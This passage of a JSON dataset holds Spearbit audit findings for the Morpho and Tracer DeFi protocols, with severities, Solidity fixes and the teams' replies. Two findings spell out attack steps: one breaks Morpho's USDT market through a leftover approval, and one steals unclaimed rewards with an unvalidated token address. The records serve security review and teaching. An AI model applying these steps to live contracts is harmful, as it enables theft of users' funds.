      "content": "## Severity: High Risk\n\n## Context\n`SwapManagerUniV2.sol#L83-L85`\n\n## Description\nThe update function returns early without updating the TWAP if the elapsed time is past the TWAP period. Meaning, once the TWAP period passes, the TWAP is stale and forever represents an old value. This could lead to a denial of service attack when claiming rewards as the wrongly calculated expected amount slippage check reverts.\n\n## Recommendation\nFix the code:\n\n```solidity\n// ensure that at least one full period has passed since the last update\n- if (timeElapsed >= PERIOD) {\n+ if (timeElapsed < PERIOD) {\nreturn;\n}\n```\n\n## Morpho\nFixed in PR #550\n\n## Spearbit\nAcknowledged.",
      "summary": "\nThis bug report is related to the SwapManagerUniV2.sol file, lines 83-85. The bug is that the update function returns early without updating the TWAP (Time Weighted Average Price) if the elapsed time is past the TWAP period, meaning that the TWAP will forever represent an old value. This could lead to a denial of service attack when claiming rewards, as the wrongly calculated expected amount slippage check will revert.\n\nThe recommendation to fix this code is to ensure that at least one full period has passed since the last update. This can be done by changing the \"if (timeElapsed >= PERIOD) {\" line to \"if (timeElapsed < PERIOD) {\", and adding \"return;\" after that. Morpho has fixed this in PR #550, and Spearbit has acknowledged the fix.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Morpho",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Validation"
      ],
      "finders": [
        "hack3r-0m",
        "Jay Jonah",
        "Christoph Michel",
        "Emanuele Ricci"
      ]
    },
    {
      "id": "6925",
      "title": "SwapManager assumes Morpho token is token0 of every token pair",
      "impact": "HIGH",
      "content": "## Vulnerability Report\n\n## Severity\n**High Risk**\n\n## Context\n`SwapManagerUniV2.sol#L106`\n\n## Description\nThe `consult` function wrongly assumes that the Morpho token is always the first token (`token0`) in the Morpho <> Reward token token pair. This could lead to inverted prices and a denial of service attack when claiming rewards, as the wrongly calculated expected amount slippage check reverts.\n\n## Recommendation\nConsider using similar code to the example UniswapV2 oracle. Note that depending on how this issue is fixed in `consult`, the caller of this function needs to be adjusted as well to return a Morpho token amount as `amountOut`.\n\n## Morpho\nFixed in PR #585.\n\n## Spearbit\nAcknowledged.",
      "summary": "\nThis bug report outlines a high risk issue in the SwapManagerUniV2.sol contract at line 106. This issue is in the consult function which wrongly assumes that the Morpho token is always the first token in theMorpho <> Reward token token pair. This could lead to inverted prices and a denial of service attack when claiming rewards as the wrongly calculated expected amount slippage check reverts.\n\nThe recommendation is to consider using similar code to the example UniswapV2 oracle. It is also noted that depending on how this issue is fixed in consult, the caller of this function needs to be adjusted to return a Morpho token amount as amountOut.\n\nMorpho has fixed this issue in PR #585 and Spearbit has acknowledged this.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Morpho",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Validation",
        "Swap"
      ],
      "finders": [
        "hack3r-0m",
        "Jay Jonah",
        "Christoph Michel",
        "Emanuele Ricci"
      ]
    },
    {
      "id": "6924",
      "title": "Wrong reserve factor computation on P2P rates",
      "impact": "HIGH",
      "content": "## Audit Report\n\n## Severity\n**High Risk**\n\n## Context\n`MarketsManagerForAave.sol#L413-L418`\n\n## Description\nThe reserve factor is taken on the entire P2P supply and borrow rates instead of just on the spread of the pool rates. Its currently overcharging suppliers and borrowers and making it possible to earn a worse rate on Morpho than the pool rates.\n\n```solidity\nsupplyP2PSPY[_marketAddress] =\n(meanSPY * (MAX_BASIS_POINTS - reserveFactor[_marketAddress])) /\nMAX_BASIS_POINTS;\n\nborrowP2PSPY[_marketAddress] =\n(meanSPY * (MAX_BASIS_POINTS + reserveFactor[_marketAddress])) /\nMAX_BASIS_POINTS;\n```\n\n## Recommendation\nFix the computation. The real reserve factor should apply only on the spread so youre right that this formula is wrong and needs to be updated: \n`a + (1/2  f)(b-a)` where f is the reserve factor.\n\n## Spearbit\nAcknowledged, fixed in PR #565.",
      "summary": "\nThis bug report is about a high-risk issue in the MarketsManagerForAave.sol code. The reserve factor is used on the entire P2P supply and borrow rates instead of just on the spread of the pool rates. This causes overcharging for suppliers and borrowers and makes it possible to earn a worse rate on Morpho than the pool rates. The suggested fix for this issue is to update the formula to a + (1/2 +- f)(b-a) where f is the reserve factor. This bug has been acknowledged and fixed in PR #565.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Morpho",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Wrong Math",
        "Protocol Reserve"
      ],
      "finders": [
        "hack3r-0m",
        "Jay Jonah",
        "Christoph Michel",
        "Emanuele Ricci"
      ]
    },
    {
      "id": "6923",
      "title": "Morphos USDT mainnet market can end up in broken state",
      "impact": "HIGH",
      "content": "## Severity: High Risk\n\n## Context\nPositionsManagerForAaveLogic.sol#L502\n\n## Description\nNote that USDT on Ethereum mainnet is non-standard and requires resetting the approval to zero (see USDT L199) before being able to change it again. \n\nIn `repayERC20ToPool`, it could be that `_amount` is approved but then `_amount = Math.min(...)` only repays a smaller amount, meaning there remains a non-zero approval for Aave. Any further `_repayERC20ToPool/_supplyERC20ToPool` calls will then revert in the approve call. Users cannot interact with most functions of the Morpho USDT market anymore.\n\n### Example\nAssume the attacker is first to borrow from the USDT market on Morpho.\n- Attacker borrows 1000 USDT through Morpho from the Aave pool (and some other collateral to cover the debt).\n- Attacker directly interacts with Aave to repay 1 USDT of debt for Aaves Morpho account position.\n- Attacker attempts to repay 1000 USDT on Morpho. It will approve 1000 USDT but the contracts debt balance is only 999 and the `_amount = Math.min(_amount, variableDebtToken.scaledBalanceOf(address(this)).mulWadByRay(_normalizedVariableDebt)` computation will only repay 999. An approval of 1 USDT remains.\n- The USDT market is broken as it reverts on supply/repay calls when trying to approve the new amount.\n\n## Recommendation\nIn `repayERC20ToPool/_supplyERC20ToPool`, do a `safeApprove(0)` first before the approval or ensure that the exact approved amount is always transferred by Aave, resetting the allowance to zero this way.\n\n## Morpho\nThis is fixed (not in the PR closed). Now we approve only what will be paid to Aave and no more. So after repayment, the allowance will always be 0.\n\n## Spearbit\nAcknowledged.",
      "summary": "\nThis bug report is related to the PositionsManagerForAaveLogic.sol#L502 of the Aave platform. A high risk vulnerability is found in the code which can be exploited by attackers. The vulnerability is related to the USDT on Ethereum mainnet which requires resetting the approval to zero before being able to change it again. The problem arises when the attacker borrows 1000 USDT through Morpho from the Aave pool and then directly interacts with Aave to repay 1 USDT of debt for Aaves Morpho account position. The attacker attempts to repay 1000 USDT on Morpho. It will approve 1000 USDT but the contracts debt balance is only 999 and the _amount = Math.min(_amount, variableDebtTo-ken.scaledBalanceOf(address(this)).mulWadByRay(_normalizedVariableDebt) computation will only repay 999. An approval of 1 USDT remains. This will break the USDT market as it reverts on supply/repay calls when trying to approve the new amount. \n\nThe recommendation is to do a safeApprove(0) first before the approval or ensure that the exact approved amount is always transferred by Aave, resetting the allowance to zero this way. Morpho has fixed this issue by approving only what will be paid to Aave and no more. Spearbit has acknowledged this bug report.",
      "quality_score": 4,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Morpho",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "hack3r-0m",
        "Jay Jonah",
        "Christoph Michel",
        "Emanuele Ricci"
      ]
    },
    {
      "id": "6922",
      "title": "FullMath requires overflow behavior",
      "impact": "HIGH",
      "content": "## Security Audit Summary\n\n## Severity\n**High Risk**\n\n## Context\n`FullMath.sol#L2`\n\n## Description\nUniswapV3s `FullMath.sol` is copied and migrated from an old solidity version to version 0.8, which reverts on overflows. However, the old `FullMath` relies on implicit overflow behavior. The current code will revert on overflows when it should not, which breaks the `SwapManagerUniV3` contract.\n\n## Recommendation\nUse the official `FullMath.sol` 0.8 branch that wraps the code in an unchecked statement. See #40.\n\n## Spearbit\nFixed. The Uniswap V3 branch is added as a dependency in PR #550.",
      "summary": "\nThis bug report is about the UniswapV3s FullMath.sol, which is copied and migrated from an old solidity version to version 0.8. This migration caused the code to revert on overflows when it should not, breaking the SwapManagerUniV3 contract. The severity of this bug is rated as high risk.\n\nThe recommendation for this bug is to use the official FullMath.sol 0.8 branch that wraps the code in an unchecked statement. The bug has been fixed with the Uniswap V3 branch added as a dependency in the PR #550.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Morpho",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "SOLC Version",
        "Overflow/Underflow"
      ],
      "finders": [
        "hack3r-0m",
        "Jay Jonah",
        "Christoph Michel",
        "Emanuele Ricci"
      ]
    },
    {
      "id": "6921",
      "title": "RewardsManagerAave does not verify token addresses",
      "impact": "HIGH",
      "content": "## Severity: Critical Risk\n\n## Context\n`RewardsManagerForAave.sol#L145-L147`\n\n## Description\nAave has 3 different types of tokens: aToken, stable debt token, and variable debt token (a/s/vToken). Aaves incentive controller can define rewards for all of them, but Morpho never uses a stable-rate borrow token (sToken). \n\nThe public `accrueUserUnclaimedRewards` function allows passing arbitrary token addresses for which to accrue user rewards. Current code assumes that if the token is not the variable debt token, then it must be the aToken, and uses the users supply balance for the reward calculation as follows:\n\n```solidity\nuint256 stakedByUser = reserve.variableDebtTokenAddress == asset\n? positionsManager.borrowBalanceInOf(reserve.aTokenAddress, _user).onPool\n: positionsManager.supplyBalanceInOf(reserve.aTokenAddress, _user).onPool;\n```\n\nAn attacker can accrue rewards by passing in an sToken address and steal from the contract. The steps are as follows:\n1. Attacker supplies a large amount of tokens for which sToken rewards are defined.\n2. The aToken reward index is updated to the latest index, but the sToken index is not initialized.\n3. Attacker calls `accrueUserUnclaimedRewards([sToken])`, which will compute the difference between the current Aave reward index and the users sToken index, then multiply it by their supply balance.\n4. The user-accumulated rewards in `userUnclaimedRewards[user]` can be withdrawn by calling `PositionManager.claimRewards([sToken, ...])`.\n5. Attacker withdraws their supplied tokens again.\n\nThe abovementioned steps can be performed in one single transaction to steal unclaimed rewards from all Morpho positions.\n\n## Recommendation\nVerify the token address to be either an aToken or vToken.\n\n```solidity\nfunction accrueUserUnclaimedRewards(address[] calldata _assets, address _user) {\n    // ...\n    for (uint256 i = 0; i < _assets.length; i++) {\n        address asset = _assets[i];\n        DataTypes.ReserveData memory reserve = lendingPool.getReserveData(\n            IGetterUnderlyingAsset(asset).UNDERLYING_ASSET_ADDRESS()\n        );\n        // ...\n        uint256 stakedByUser;\n        if (reserve.variableDebtTokenAddress == asset) {\n            stakedByUser = positionsManager.borrowBalanceInOf(reserve.aTokenAddress, _user).onPool;\n        } else {\n            require(reserve.aTokenAddress == asset, \"invalid asset\");\n            stakedByUser = positionsManager.supplyBalanceInOf(reserve.aTokenAddress, _user).onPool;\n        }\n        // ...\n    }\n}\n```\n\n## Morpho\nFixed, the recommendation has been implemented in PR #554.\n\n## Spearbit\nAcknowledged.",
      "summary": "\nThis bug report concerns the RewardsManagerForAave.sol smart contract, which is used to manage rewards for Aave's three different types of tokens. The bug was that the public accrueUserUnclaimedRewards function allowed an attacker to pass in an sToken address and steal from the contract. The code assumed that if the token was not the variable debt token, then it must be the aToken, and used the users supply balance for the reward calculation.\n\nTo fix the issue, the code was changed to verify the token address to be either an aToken or vToken, and to require a valid asset address. The fix was implemented in PR #554. The bug was acknowledged and the report was closed.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Morpho",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Validation"
      ],
      "finders": [
        "hack3r-0m",
        "Jay Jonah",
        "Christoph Michel",
        "Emanuele Ricci"
      ]
    },
    {
      "id": "6920",
      "title": "MatchingEngineForAave is using the wrong totalSupply in updateBorrowers",
      "impact": "HIGH",
      "content": "## Security Risk Assessment\n\n## Severity\n**Critical Risk**\n\n## Context\n`MatchingEngineForAave.sol#L376-L385`\n\n## Description\nThe `_poolTokenAddress` is referencing `AToken`, so the `totalStaked` would be the total supply of the `AToken`. In this case, the `totalStaked` should reference the total supply of the `DebtToken`; otherwise, the user would be rewarded for a wrong amount of reward.\n\n## Recommendation\nUse the correct token address to query `scaledTotalSupply` as follows:\n\n```solidity\naddress variableDebtTokenAddress = lendingPool\n    .getReserveData(IAToken(_poolTokenAddress).UNDERLYING_ASSET_ADDRESS())\n    .variableDebtTokenAddress;\n\nuint256 totalStaked = IScaledBalanceToken(variableDebtTokenAddress).scaledTotalSupply();\n```\n\n## Spearbit\nFixed; recommendation was implemented in the PR #554.",
      "summary": "\nThis bug report is about a critical risk issue that was found in the MatchingEngineForAave.sol code. The issue is that the _poolTokenAddress is referencing the AToken, when it should be referencing the DebtToken. If this is not corrected, the user would be rewarded for a wrong amount. To solve the issue, the correct token address should be used to query the scaledTotalSupply. The recommendation was implemented in the PR #554 and the bug has been fixed.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Morpho",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Wrong Math",
        "Business Logic"
      ],
      "finders": [
        "hack3r-0m",
        "Jay Jonah",
        "Christoph Michel",
        "Emanuele Ricci"
      ]
    },
    {
      "id": "6919",
      "title": "Wrong P2P exchange rate calculation",
      "impact": "HIGH",
      "content": "## Security Report\n\n## Severity\n**Critical Risk**\n\n## Context\nMarketsManagerForAave.sol#L436\n\n## Description\n`_p2pDelta` is divided by `_poolIndex` and multiplied by `_p2pRate`, nevertheless it should have been multiplied by `_poolIndex` and divided by `_p2pRate` to compute the correct share of the delta. This leads to wrong P2P rates throughout all markets if supply/borrow delta is involved.\n\n## Recommendation\nChange order and adjust return values accordingly.\n\n```solidity\nuint256 shareOfTheDelta = _p2pDelta\n  .wadToRay()\n  - .rayMul(_p2pRate)\n  - .rayDiv(_poolIndex)\n  + .rayMul(_poolIndex)\n  + .rayDiv(_p2pRate)\n  .rayDiv(_p2pAmount.wadToRay());\n```\n\n## Morpho\nFixed in PR #536, `_computeNewP2PExchangeRate` is changed as recommended.\n\n## Spearbit\nAcknowledged.",
      "summary": "\nThis bug report is regarding the MarketsManagerForAave.sol#L436. The issue is that _p2pDelta is divided by _poolIndex and multiplied by _p2pRate, which is incorrect. The correct order should be to multiply by _poolIndex and divide by _p2pRate to compute the correct share of the delta. This leads to wrong P2P rates throughout all markets if supply / borrow delta is involved.\n\nThe recommendation is to change the order and adjust the return values accordingly. The code should be changed to the following: uint256 shareOfTheDelta = _p2pDelta.wadToRay().rayMul(_poolIndex).rayDiv(_p2pRate).rayDiv(_p2pAmount.wadToRay());\n\nMorpho has fixed this issue in PR #536, where _computeNewP2PExchangeRate is changed as recommended. Spearbit has acknowledged this.",
      "quality_score": 5,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Morpho",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Morpho-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Wrong Math"
      ],
      "finders": [
        "hack3r-0m",
        "Jay Jonah",
        "Christoph Michel",
        "Emanuele Ricci"
      ]
    },
    {
      "id": "6758",
      "title": "Committer not validated on withdraw claim and multi-paid claim",
      "impact": "LOW",
      "content": "## Security Analysis Report\n\n## Severity: Low Risk\n\n### Context\n- AutoClaim.sol#L118\n- AutoClaim.sol#L136\n- AutoClaim.sol#L150\n\n### Description\nAutoClaim checks that the committer creating the claim request in `makePaidClaimRequest` and withdrawing the claim request in `withdrawUserClaimRequest` is a valid committer for the `PoolFactory` used in the AutoClaim initializer. The same security check should be done in all the other functions where the committer is passed as a function parameter.\n\n### Recommendation\nA validity check should be added for the `poolCommitter` passed as a parameter, as it is done in scenarios where the `msg.sender` is the committer itself.\n\n#### Code Snippet\n\n```solidity\nfunction multiPaidClaimMultiplePoolCommitters(address[] calldata users, address[] calldata poolCommitterAddresses) external override {\n    ...\n    for (uint256 i; i < users.length; i++) {\n        require(poolFactory.isValidPoolCommitter(poolCommitterAddresses[i]), \"poolCommitter not valid PoolCommitter\");\n        ...\n    }\n    ...\n}\n\nfunction multiPaidClaimSinglePoolCommitter(address[] calldata users, address poolCommitterAddress) external override {\n    require(poolFactory.isValidPoolCommitter(poolCommitterAddress), \"poolCommitter not valid PoolCommitter\");\n    ...\n}\n\nfunction withdrawClaimRequest(address poolCommitter) external override {\n    require(poolFactory.isValidPoolCommitter(poolCommitter), \"poolCommitter not valid PoolCommitter\");\n    ...\n}\n```\n\n### Tracer\nWe are trying to evaluate the benefits of this.\n\nIn the case of `multiPaidClaimMultiplePoolCommitters()`:\n- More gas: This would be an extra check for every iteration.\n- `checkClaim()` will return false, meaning nothing will happen when the `claim()` function is called.\n- Correct implementations of the off-chain auto claiming bots will use correct data.\n\nThe same can be applied to `multiPaidClaimSinglePoolCommitter()`, but only one extra check would be required rather than in every iteration. We do not believe we should be doing on-chain stuff to cater for incorrect off-chain bot implementations. In the case of `withdrawClaimRequest()`, Id be OK with adding this check.\n\n### Spearbit\nIt is less about catering for incorrect off-chain bots, but more about hardening security. We do not think it is immediately obvious why not checking the validity of the pool committers in these functions is not a security issue. You need to argue that:\n- Claim requests can only be made by and stored with valid pool committers as an index, so invalid pool committer rewards will always be zero.\n- An attacker-controlled pool committer argument does not lead to re-entrancy and other security issues in these functions.\n- Also, not checking it might be fine now, but not anymore with future code updates, and it is easy to forget that the pool committers are not checked for validity in all functions.\n\nOf course, it is up to you to decide if the additional security checks are worth the gas costs. You should at least document that you are deliberately not checking the validity here and state the above-mentioned reasoning why it is not a security issue in the current code.\n\n### Tracer\n- Claim requests can only be made by and stored with valid pool committers as an index, so invalid pool committer rewards will always be zero. We think this is already enforced by including the `onlyPoolCommitter()` modifier in `makePaidClaimRequest()`, so any subsequent claim attempts will only have claim requests that are populated with non-zero data if it was a pool committer deployed by the factory.\n- An attacker-controlled pool committer argument does not lead to re-entrancy and other security issues in these functions. We believe this should always hold due to the `checkClaim()` call in the `multiPaidClaimMultiplePoolCommitters()` and `multiPaidClaimSinglePoolCommitter()` functions.\n- Also, not checking it might be fine now, but not anymore with future code updates, and it is easy to forget that the pool committers are not checked for validity in all functions. This is definitely a good point and we would be happy to add these checks for this reason. Addressed in issue 359.\n\n### Spearbit\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Emanuele Ricci",
        "Christoph Michel",
        "Rusty (f7dd60e9cfad19996d73)",
        "Gerard Persoon"
      ]
    },
    {
      "id": "6757",
      "title": "Race condition if PoolFactory deploy pools before fees are set",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\n- **PoolFactory**\n- **PoolCommitter**\n\n## Description\nThe `deployPool` function of the `PoolFactory` contract can deploy pools before the `changeInterval` value and minting and burning fees are set. This means that fees would not be subtracted. The exact boundaries for the `mintingFee`, `burningFee`, and `changeInterval` values arent clear. In some parts of the code `< 1e18` is used, and in other parts `<= 1e18`.\n\nFurthermore, the `initialize()` function of the `PoolCommitter` contract doesnt check the value of `changeInterval`. The `setBurningFee()`, `setMintingFee()`, and `setChangeInterval()` functions of the `PoolCommitter` contract dont check the new values. Finally, two representations of `1e18` are used: `1e18` and `PoolSwapLibrary.WAD_PRECISION`.\n\n```solidity\ncontract PoolFactory is IPoolFactory, Ownable {\n    function setMintAndBurnFeeAndChangeInterval(uint256 _mintingFee, uint256 _burningFee,...) ... {\n        ...\n        require(_mintingFee <= 1e18, \"Fee cannot be > 100%\");\n        require(_burningFee <= 1e18, \"Fee cannot be > 100%\");\n        require(_changeInterval <= 1e18, \"Change interval cannot be > 100%\");\n        \n        mintingFee = _mintingFee;\n        burningFee = _burningFee;\n        changeInterval = _changeInterval;\n        ...\n    }\n\n    function deployPool(PoolDeployment calldata deploymentParameters) external override returns\n    (address) { \n        ...\n        // no check that mintingFee, burningFee, changeInterval are set\n        poolCommitter.initialize(..., mintingFee, burningFee, changeInterval, ...);\n    }\n}\n```\n\n```solidity\ncontract PoolCommitter is IPoolCommitter, Initializable {\n    function initialize(... ,uint256 _mintingFee, uint256 _burningFee,... ) ... {\n        ...\n        require(_mintingFee < PoolSwapLibrary.WAD_PRECISION, \"Minting fee >= 100%\");\n        require(_burningFee < PoolSwapLibrary.WAD_PRECISION, \"Burning fee >= 100%\");\n        ... // no check on _changeInterval\n        \n        mintingFee = PoolSwapLibrary.convertUIntToDecimal(_mintingFee);\n        burningFee = PoolSwapLibrary.convertUIntToDecimal(_burningFee);\n        changeInterval = PoolSwapLibrary.convertUIntToDecimal(_changeInterval);\n        ...\n    }\n\n    function setBurningFee(uint256 _burningFee) external override onlyGov {\n        burningFee = PoolSwapLibrary.convertUIntToDecimal(_burningFee); // no check on _burningFee\n        ...\n    }\n\n    function setMintingFee(uint256 _mintingFee) external override onlyGov {\n        mintingFee = PoolSwapLibrary.convertUIntToDecimal(_mintingFee); // no check on _mintingFee\n        ...\n    }\n\n    function setChangeInterval(uint256 _changeInterval) external override onlyGov {\n        changeInterval = PoolSwapLibrary.convertUIntToDecimal(_changeInterval); // no check on _changeInterval\n        ...\n    }\n\n    function updateMintingFee(bytes16 longTokenPrice, bytes16 shortTokenPrice) private {\n        ...\n        if (PoolSwapLibrary.compareDecimals(mintingFee, MAX_MINTING_FEE) == 1) {\n            // mintingFee is greater than 1 (100%).\n            // We want to cap this at a theoretical max of 100%\n            mintingFee = MAX_MINTING_FEE; // so mintingFee is allowed to be 1e18\n        }\n    }\n}\n```\n\n## Recommendation\n- Initialize the values of `mintingFee`, `burningFee`, and `changeInterval` in the constructor of the `PoolFactory` contract, or check in the `deployPool()` function that the values for `mintingFee`, `burningFee`, and `changeInterval` are set.\n- Double-check the maximum values of `mintingFee`, `burningFee`, and `changeInterval`.\n- Check the value of `_changeInterval` in the `initialize()` function of the `PoolCommitter` contract.\n- Check the new values in `setBurningFee()`, `setMintingFee()`, and `setChangeInterval()` functions of the `PoolCommitter` contract.\n- Replace `1e18` with `PoolSwapLibrary.WAD_PRECISION`.\n\n## Tracer\nDisputed, as it is fine if we want 0 minting/burning fee and change interval. This is because the minting, burning, but most particularly the change interval, are things we want to experiment with in the real market and we want to be able to not use them if desired. Furthermore, the `PoolDeployment` type captures the market creators desire for fees, so this seems like a non-issue. \n\nAs for the bounds on both minting and burning fees, the inconsistency in enforcement of the upper bounds is a defect but we have since capped the burning fee arbitrarily at 10%, so this seems to be an implicit mitigation. We dont have a cap on what the minting fee can be. This was a decision made by our R&D.\n\n## Spearbit\nIt might be helpful to add a comment to the definition of the `mintingFee`, `burningFee`, and `changeInterval` variables, stating that a zero-value is also allowed.\n\n## Tracer\nAddressed in PR 421.\n\n## Spearbit\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Emanuele Ricci",
        "Christoph Michel",
        "Rusty (f7dd60e9cfad19996d73)",
        "Gerard Persoon"
      ]
    },
    {
      "id": "6756",
      "title": "Ether could be lost when calling commit()",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context \n`PoolCommitter.sol#L263-L317`\n\n## Description \nThe `commit()` function sends the supplied ETH to `makePaidClaimRequest()` only if `payForClaim == true`. If the caller of `commit()` accidentally sends ETH when `payForClaim == false`, then the ETH stays in the `PoolCommitter` contract and is effectively lost.\n\n**Note:** This was also documented in Secureums CARE Tracking.\n\n```solidity\nfunction commit(...) external payable override checkInvariantsAfterFunction {\n    ...\n    if (payForClaim) {\n        autoClaim.makePaidClaimRequest{value: msg.value}(msg.sender);\n    }\n}\n```\n\n## Recommendation \nConsider changing the code to:\n\n```solidity\nfunction commit(...) external payable override checkInvariantsAfterFunction {\n    ...\n    if (payForClaim) {\n        require(msg.value != 0, \"Must pay for claim\");\n        autoClaim.makePaidClaimRequest{value: msg.value}(msg.sender);\n    } else {\n        require(msg.value == 0, \"user's ETH would be lost\");\n    }\n}\n```\n\n## Tracer \nValid, fixed in PR 326.\n\n## Spearbit \nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Emanuele Ricci",
        "Christoph Michel",
        "Rusty (f7dd60e9cfad19996d73)",
        "Gerard Persoon"
      ]
    },
    {
      "id": "6755",
      "title": "Pool information might be lost if setFactory() ofPoolKeeper contract is called",
      "impact": "LOW",
      "content": "## Vulnerability Report\n\n## Severity\nLow Risk\n\n## Context\n- `PoolKeeper.sol#L324-L327`\n- `PoolKeeper.sol#L83-L86`\n\n## Description\nThe `PoolKeeper` contract has a function to change the factory: `setFactory()`. However, calling this function will make previous pools inaccessible for this `PoolKeeper` unless the new factory imports the pools from the old factory.\n\nThe `isUpkeepRequiredSinglePool()` function calls `factory.isValidPool(_pool)`, and it will fail because the new factory doesnt know about the old pools. As this call is essential for upkeeping, the entire upkeep mechanism will fail.\n\n```solidity\nfunction setFactory(address _factory) external override onlyOwner {\n    factory = IPoolFactory(_factory);\n    ...\n}\n\nfunction isUpkeepRequiredSinglePool(address _pool) public view override returns (bool) {\n    if (!factory.isValidPool(_pool)) { // might not work if factory is changed\n        return false;\n    }\n    ...\n}\n```\n\n## Recommendation\nMake sure the implementations of `setFactory()` and `isUpkeepRequiredSinglePool()` are correct to specification when the factory is changed.\n\n## Tracer\nValid, fixed in PR 340.\n\n## Spearbit\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Emanuele Ricci",
        "Christoph Michel",
        "Rusty (f7dd60e9cfad19996d73)",
        "Gerard Persoon"
      ]
    },
    {
      "id": "6754",
      "title": "updateAggregateBalance() can run out of gas",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n**Context:** PoolCommitter.sol#L609-L682\n\n**Description:**  \nThe `updateAggregateBalance()` function of the PoolCommitter contract contains a for loop that, in theory, could use up all the gas and result in a revert. The `updateAggregateBalance()` function checks all future intervals every time it is called and adds them back to the `unAggregatedCommitments` array, which is checked in the next function call. This would only be a problem if `frontRunningInterval` is much larger than `updateInterval`, a situation that seems unlikely in practice.\n\n```solidity\nfunction updateAggregateBalance(address user) public override checkInvariantsAfterFunction {\n    ...\n    uint256[] memory currentIntervalIds = unAggregatedCommitments[user];\n    uint256 unAggregatedLength = currentIntervalIds.length;\n    for (uint256 i = 0; i < unAggregatedLength; i++) {\n        uint256 id = currentIntervalIds[i];\n        ...\n        UserCommitment memory commitment = userCommitments[user][id];\n        ...\n        if (commitment.updateIntervalId < updateIntervalId) {\n            ...\n        } else {\n            ...\n            storageArrayPlaceHolder.push(currentIntervalIds[i]); // entry for future intervals stays in array, !\n        }\n    }\n    delete unAggregatedCommitments[user];\n    unAggregatedCommitments[user] = storageArrayPlaceHolder;\n    ...\n}\n```\n\n**Recommendation:**  \nAn upper limit to the number of future intervals (e.g. `frontRunningInterval / updateInterval`) should be set in the `initialize()` function of the LeveragedPool contract.\n\n**Tracer:**  \nAddressed in PR 392.\n\n**Spearbit:**  \nHave you checked if `MAX_ITERATIONS = type(uint8).max` loops is possible within gas limits? `updateAggregateBalance()` deletes all `unAggregatedCommitments[]` while there may be some commitments that have not been processed if the limit was reached. `getAggregateBalance()` does limit the loop, so it could give a different result.\n\n**Tracer:**  \nThanks for raising that. We created this PR addressing it. We also realized `PoolSwapLibrary::appropriateUpdateIntervalId` was still buggy when the frontrunning interval is greater than the update interval.\n\n**Spearbit:**  \nIt looks good. Some minor suggestions:  \n- `commitmentIds.pop()` can be put after the `if` statement, as it is executed both in the `if` and `else` blocks.  \n- It is safer to put `commitmentIds.length > 1` before the `i < commitmentIds.length - 1`. If `commitmentIds.length` happens to be 0, then the statement will revert at `commitmentIds.length - 1`, although with the current code this will not happen.\n\n```solidity\nif (unAggregatedLength > MAX_ITERATIONS && i < commitmentIds.length - 1 && commitmentIds.length > 1) {\n    commitmentIds[i] = commitmentIds[commitmentIds.length - 1];\n    commitmentIds.pop();\n} else {\n    commitmentIds.pop();\n}\n```\n\n**Tracer:**  \nWe implemented the changes in PR 430.\n\n**Spearbit:**  \nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
